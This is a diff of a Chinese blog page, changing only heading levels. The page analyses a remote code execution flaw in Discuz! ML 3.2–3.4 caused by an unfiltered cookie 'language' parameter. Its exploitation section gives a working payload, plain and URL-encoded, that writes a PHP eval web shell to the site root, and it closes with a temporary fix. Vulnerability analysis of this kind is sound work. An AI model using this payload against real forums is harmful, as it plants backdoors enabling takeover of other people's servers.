@@ -59,7 +59,7 @@
 <p>Discuz ML漏洞程序下载：<a href="/uploads/2019/07/1993670169.zip">1993670169.zip</a></p>
 <a id="more"></a>
 
-<h2 id="受影响系统版本"><a href="#受影响系统版本" class="headerlink" title="受影响系统版本"></a>受影响系统版本</h2><ul>
+<h3 id="受影响系统版本"><a href="#受影响系统版本" class="headerlink" title="受影响系统版本"></a>受影响系统版本</h3><ul>
 <li><p>Discuz! ML v.3.4</p>
 </li>
 <li><p>Discuz! ML v.3.3</p>
@@ -67,8 +67,8 @@
 <li><p>Discuz! ML v.3.2</p>
 </li>
 </ul>
-<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>这次漏洞产生的主要原因是因为没有对cookie字段language参数过滤，导致用户可拼接写入缓存文件中，缓存文件被加载后，造成了代码执行漏洞。</p>
-<h2 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h2><p>在 <code>\source\class\discuz\discuz_application.php</code> 第304行</p>
+<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>这次漏洞产生的主要原因是因为没有对cookie字段language参数过滤，导致用户可拼接写入缓存文件中，缓存文件被加载后，造成了代码执行漏洞。</p>
+<h3 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h3><p>在 <code>\source\class\discuz\discuz_application.php</code> 第304行</p>
 <p><img src="/uploads/2019/07/2030324207.png" alt="1.png"></p>
 <p>可以看到，这里取出cookie之后转小写赋值给 <code>$lng</code> 变量，并没有过滤</p>
 <p><img src="/uploads/2019/07/2851306668.png" alt="2.png"></p>
@@ -96,7 +96,7 @@
 <p>在 <code>\source\module\forum\forum_index.php</code> 432行，使用 <code>include</code> 函数包含了 <code>template</code> 方法的返回值</p>
 <p><img src="/uploads/2019/07/2347786358.png" alt="12.png"></p>
 <p>跟踪这个方法 在 <code>\source\function\function_core.php</code> 654行，包含了 <code>$cachefile</code> 路径，也就是我们插入Payload缓存文件的路径。在上一步，被include包含加载执行，导致了代码执行漏洞。</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>当然，我们可以使用我们自己构造的Payload写入一句话木马</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>当然，我们可以使用我们自己构造的Payload写入一句话木马</p>
 <p><code>&#39;.file_put_contents(&#39;1.php&#39;,urldecode(&#39;&lt;?php eval($_POST[&quot;x&quot;]);?&gt;&#39;)).&#39;</code> 将这个替换之前的Payload，使其访问后在根目录下新建 <code>1.php</code> 文件，写入一句话木马。</p>
 <p>因为是通过url编码的，所以最好使用下面的Payload</p>
 <p><code>%27.file_put_contents%28%271.php%27%2Curldecode%28%27%253c%253fphp%2520eval%28%2524_%2550%254F%2553%2554%255b%2522x%2522%255d%29%253b%253f%253e%27%29%29.%27</code></p>
@@ -104,7 +104,7 @@
 <p>替换之前的Payload</p>
 <p><img src="/uploads/2019/07/56761383.png" alt="14.png"></p>
 <p>当我们在放包后，访问该页面Payload被执行，在根目录下就会生成 <code>1.php</code> 一句话木马文件。</p>
-<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>看了网上大佬的文章，其实暂时性修复，可以把 <code>$lng</code> 变量的参数值进行替换。</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>看了网上大佬的文章，其实暂时性修复，可以把 <code>$lng</code> 变量的参数值进行替换。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$lng = str_replace(<span class="string">"("</span>,<span class="string">""</span>,$lng);</span><br><span class="line">$lng = str_replace(<span class="string">")"</span>,<span class="string">""</span>,$lng);</span><br><span class="line">$lng = str_replace(<span class="string">"'"</span>,<span class="string">""</span>,$lng);</span><br><span class="line">$lng = str_replace(<span class="string">'"'</span>,<span class="string">""</span>,$lng);</span><br><span class="line">$lng = str_replace(<span class="string">'`'</span>,<span class="string">""</span>,$lng);</span><br></pre></td></tr></table></figure>
 
 <p>将 <code>( ) &#39; &quot;</code> 进行替换过滤，可以暂时修复。</p>
